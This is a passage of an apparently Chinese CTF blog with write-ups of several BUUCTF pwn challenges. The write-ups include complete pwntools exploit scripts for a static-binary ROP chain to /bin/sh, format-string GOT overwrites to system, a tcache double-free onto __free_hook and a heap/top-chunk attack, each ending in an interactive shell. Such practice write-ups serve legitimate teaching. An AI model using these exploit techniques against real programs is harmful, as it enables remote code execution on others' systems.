class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;size\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        ru(<span class="hljs-string">&#x27;addr 0x&#x27;</span>)<br>        heap=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>        sa(<span class="hljs-string">&#x27;content\n&#x27;</span>,content)<br>        <span class="hljs-keyword">return</span> heap<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------</span><br>libc_base=add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x201000</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;libc_base : &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>heap_base=add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;heap_base : &#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>top_ptr=heap_base+<span class="hljs-number">0x10</span><br>malloc_hook = libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] + libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;malloc_hook:&#x27;</span>+<span class="hljs-built_in">hex</span>(malloc_hook))<br>offset=malloc_hook-top_ptr-<span class="hljs-number">0xf</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span><br>realloc=libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;realloc:&#x27;</span>+<span class="hljs-built_in">hex</span>(realloc))<br>og=o_g_old[<span class="hljs-number">1</span>]+libc_base<br>add(offset,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(og)+p64(realloc+<span class="hljs-number">16</span>))<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;size\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x50</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-can-you-gets-me">picoctf_2018_can_you_gets_me</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/112951679">BUUCTF]PWN——picoctf_2018_can_you_gets_me_mcmuyanga的博客-CSDN博客</a></p><p>对付这种静态编译题，ropchain铁定行</p><p>ROPgadget --binary PicoCTF_2018_can-you-gets-me  --ropchain</p><p><strong>注意</strong>要导入个pack，from struct import pack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28020</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pd</span>():<br>        p = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)<br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b81c6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>        p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b81c6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>        p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049303</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de955</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049303</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a86f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806cc25</span>) <span class="hljs-comment"># int 0x80</span><br>        <span class="hljs-keyword">return</span> p<br>payload=pd()<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easy-equation">mrctf2020_easy_equation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29673</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x4006D0</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wdb-2018-2nd-easyfmt">wdb_2018_2nd_easyfmt</h3><p>参考师傅：<a href="https://blog.csdn.net/qq_43935969/article/details/116140885">wdb_2018_2nd_easyfmt详解_像初雪一样自由洒落-CSDN博客</a></p><p>**pwntools工具使用：fmtstr_payload(offset,{printf_got:system})**把got表改为system</p><p>呃呃呃，好像只能用在32位</p><p><strong>具体步骤：</strong></p><p>1.利用格式化字符串漏洞泄露printf_got,得知libc_base,</p><p>2.利用格式化字符串漏洞把printf_got改为system</p><p>3.送入/bin/sh\x00</p><p>**注意点：**32为接收泄露addr=u32(r.recvuntil(‘\xf7’)[-4:])</p><p>**疑惑：**经格式字符串漏洞泄露出来的printf_addr=elf.got[‘printf’]和直接printf_got=elf.got[‘printf’]不是同一个地址</p><p>为啥？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./wdb_2018_2nd_easyfmt&#x27;)</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28021</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;Do you know repeater?&#x27;</span>)<br>r.sendline(p32(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>])+<span class="hljs-string">&#x27;%6$s&#x27;</span>)<br>printf_addr=u32(r.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf_addr)<br>base=printf_addr-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(printf_got)<br>payload = fmtstr_payload(<span class="hljs-number">6</span>,&#123;printf_got:system&#125;)<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-1">ciscn_2019_es_1</h3><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/118193874?ops_request_misc=%7B%22request%5Fid%22%3A%22163555827616780366547653%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163555827616780366547653&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-118193874.pc_search_ecpm_flag&amp;utm_term=ciscn_2019_es_1&amp;spm=1018.2226.3001.4187">BUUCTF]PWN——ciscn_2019_es_1_mcmuyanga的博客-CSDN博客</a></p><p>本题有uaf漏洞</p><p><strong>具体步骤：</strong></p><p>1.分配small_bin大小的chunk，大于0x400即可，绕过tcache，释放后就会放到unsortbin中，利用uaf，泄露main_arena-96的地址，</p><p>由于malloc_hook在main_arena-0x10处,所以也能泄露libc_base=main_arena-0x10-libc.sym[‘__malloc_hook’]</p><p>2.利用doublefree，达成任意位置写入任意值的目的，这里我们往free_hook写入system</p><p>(这题不好改malloc_hook，因为修改后，程序执行下一次会申请一个0x18大小chunk，而我们不好控制为’/bin/sh\x00’)</p><p>3.释放存有/bin/sh\x00的某个堆，开shell</p><p><strong>ps:</strong></p><p>20年10月后，2.27libc加了double free检测。所以要做这道题本地调试的时候还得要使用<code>patchelf</code>来更改一下使用的动态库.</p><p>感谢下carol7s师傅帮我搞了个改动态库链接的一个脚本，不过貌似改了库链接后还是调试不了</p><p><strong>最后的doublefree自己的主观解释</strong>，没法调试看到：</p><p>释放两次时tcache的bin链：free1_addr-&gt;free1_addr</p><p>第一次申请时的bin链:free1_addr-&gt;free_hook_addr</p><p>第二次申请时的bin链：free_hook_addr</p><p>后面就申请到free_hook_addr中写入system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_es_1&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28127</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name,phone</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;name\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;please input name:\n&#x27;</span>,name)<br>    sa(<span class="hljs-string">&#x27;please input compary call:\n&#x27;</span>,phone)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#----------------------------------------------</span><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&#x27;name:\n&#x27;</span>)<br>main_arena=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">96</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(main_arena)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br><span class="hljs-comment">#--------------------------------------------</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x20</span>,p64(free_hook),<span class="hljs-string">&#x27;1&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,p64(system),<span class="hljs-string">&#x27;3&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-fmt64">axb_2019_fmt64</h3><p>这题写的神志不清了属于是。还有好多疑惑</p><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/113242453?ops_request_misc=%7B%22request%5Fid%22%3A%22163556754916780366559453%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163556754916780366559453&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113242453.pc_search_ecpm_flag&amp;utm_term=axb_2019_fmt64&amp;spm=1018.2226.3001.4187">BUUCTF]PWN——axb_2019_fmt64（64位格式化字符串改got表）_mcmuyanga的博客-CSDN博客</a></p><p><strong>具体步骤：</strong></p><p>1.格式化字符串漏洞泄露libc_base</p><p>2.格式化字符串漏洞改写got表为system</p><p>3.送入/bin/sh</p><p><strong>64位改写got表：</strong></p><p>1.high_sys=(system&gt;&gt;16)&amp;0xff<br>low_sys=system&amp;0xffff</p><p>分别取倒数第三个字节，和最后2个字节</p><p>2.payload=‘%’+str(high_sys-9)+‘c%12$hhn’+‘%’+str(low_sys-high_sys)+‘c%13$hn’<br>print len(payload)<br>payload = payload.ljust(32,“A”) + p64(elf.got[“strlen”] + 2) + p64(elf.got[“strlen”])</p><p>sa(‘Please tell me:’,payload)</p><p>分字节修改strlen的got表为system（hhn是一个字节，hn是两个字节）</p><p><a href="http://3.sa">3.sa</a>(‘Please tell me:’,‘;bin/sh\x00’)</p><p>送/bin/sh\x00</p><p>因为防止格式化字符串被00截断，所以格式化字符串要放在got前面</p><p><strong>疑惑</strong>：orz</p><p>为啥binsh前要加；</p><p>为啥改strlen的got能用，我改printf，sprintf不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_fmt64&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span 